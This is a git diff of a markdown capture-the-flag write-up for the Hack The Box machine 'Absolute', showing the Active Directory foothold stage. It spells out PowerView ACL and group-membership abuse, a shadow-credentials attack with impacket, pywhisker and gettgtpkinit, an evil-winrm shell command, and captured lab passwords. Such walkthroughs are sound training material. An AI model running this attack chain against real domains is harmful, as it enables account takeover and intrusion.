@@ -123,16 +123,69 @@ Out of all of these users, m.lovegod has the most privileges. The user owns the 
 
 <figure><img src="../../../.gitbook/assets/image (33) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
-We now need to somehow get a ticket from this m.lovegod user, or find his credentials.&#x20;
+We now need to somehow get a ticket from the `m.lovegod` user and gain access as the `winrm_user` to get a shell.
 
 ### Test.exe
 
-When I ran the binary on my Windows VM, it seems to exit straightaway. I started Wireshark to see what I could capture from it, guessing that it was trying to make a connection back to the host somehow.
+When I ran the binary on my Windows VM, it seems to exit straightaway. Weird, but maybe it was trying to make external connections. I started Wireshark to see what I could capture from it. I found this interesting bit here when I connected to the HTB VPN.
 
-I found this interesting tidbit here.
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>
+We now have credentials for this user!&#x20;
 
-Seems like there's a password being transmitted here to the LDAP server. The next step is trivial, we just need to run this thing on a VM connected to the VPN and we should get somewhere.
+### Pivoting
 
-WIP!
+Now that we know that the `m.lovegod` user owns the Network Audit group, and members of that group have GenericWrite over the `winrm_user`, we need to somehow add him into the group. We can use `pywhisker` to do so.&#x20;
+
+First, we need to request a ST using `impacket-getTGT` using these credentials. Then we can export to `KRB5CCNAME`.
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+The tricky part was figuring out how to use this ticket. The easiest way to do this is to use a Windows VM connected to the VPN and run some Powerview commands on it, such as `Add-DomainObjectAcl` and stuff. We have to do this because it is not possible for us to use this ticket to add group members to the Network Audit group from a Linux machine. (I could not make pywhisker or dacledit) to work.
+
+Anyways, I booted up a Windows VPN and did the following:
+
+* Downloaded ActiveDirectory module and Powerview
+* Connected to HTB VPN
+* Added `absolute.htb` to the `C:\Windows\system32\drivers\etc\hosts` file
+* Changed Internet time to `absolute.htb` (Control Panel > Clock and Region > Date and Time > Internet Time and add IP address)
+* Changed Network DNS Server to the IP address of DC (Control Panel > Network and Internet > Network and Sharing Center > Change Adapter Settings > Properties of the VPN adapter > Internet Procotol Version 4 Properties > Add the IP of the DC to DNS server.
+
+Then I ran these commands:
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>Import-Module .\PowerView.ps1
+</strong><strong>$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
+</strong>$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
+<strong>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController dc.absolute.htb -PrincipalIdentity "m.lovegod"
+</strong>Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server dc.absolute.htb
+</code></pre>
+
+You might need to run the last 2 powershell commands again and again until no errors come up. Afterwards, we can switch back to the Kali machine **quickly!** The AD machine seems to reset this change in configurations super fast.
+
+We need to then run this:
+
+```bash
+impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb; export KRB5CCNAME=m.lovegod.ccache; python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
+```
+
+Afterwards, we should get a .pfx file.
+
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Now we have a .pfx file that we can use to get a .ccache file for the `winrm_user`. This can be done with `gettgtpkinit.py`.
+
+{% code overflow="wrap" %}
+```bash
+python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx pWOtRDep.pfx -pfx-pass 1k8t3aDNsx44g7mTAwY5 winrm_user
+export KRB5CCNAME = winrm_user.ccache
+evil-winrm -i dc.absolute.htb -r absolute.htb
+```
+{% endcode %}
+
+This would give us an evil\_winrm shell as the user and we can grab the flag.
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation
+
+Really hard...WIP.
